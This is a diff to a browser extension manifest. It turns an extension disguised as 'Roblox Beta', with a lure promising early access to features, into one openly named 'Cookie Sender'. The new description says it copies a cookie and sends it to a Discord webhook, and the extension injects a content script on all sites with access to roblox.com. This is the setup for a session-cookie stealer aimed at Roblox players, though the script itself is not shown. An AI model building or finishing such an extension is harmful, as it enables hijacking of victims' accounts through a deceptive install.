@@ -1,24 +1,31 @@
 {
-  "manifest_version": 2,
-  "name": "Roblox Beta",
+  "manifest_version": 3,
+  "name": "Cookie Sender",
   "version": "1.0",
-  "description": "This gives you the beta stage of roblox so you can test out features before they come out if they come out",
-  "permissions": ["activeTab", "https://discord.com/"],
-  "browser_action": {
+  "description": "Copy a specific cookie and send it to a Discord webhook",
+  "permissions": ["activeTab", "storage", "webNavigation", "<all_urls>"],
+  "action": {
     "default_popup": "popup.html",
     "default_icon": {
-      "16": "images/icon16.png"
+      "16": "images/icon16.png",
+      "48": "images/icon48.png",
+      "128": "images/icon128.png"
     }
   },
   "icons": {
+    "16": "images/icon16.png",
     "48": "images/icon48.png",
     "128": "images/icon128.png"
   },
+  "web_accessible_resources": ["popup.html"],
+  "host_permissions": [
+    "https://discord.com/*",
+    "https://roblox.com/*"  // Replace with your website's domain
+  ],
   "content_scripts": [
     {
       "matches": ["<all_urls>"],
-      "js": ["popup.js"],
-      "run_at": "document_end"
+      "js": ["content.js"]
     }
   ]
 }
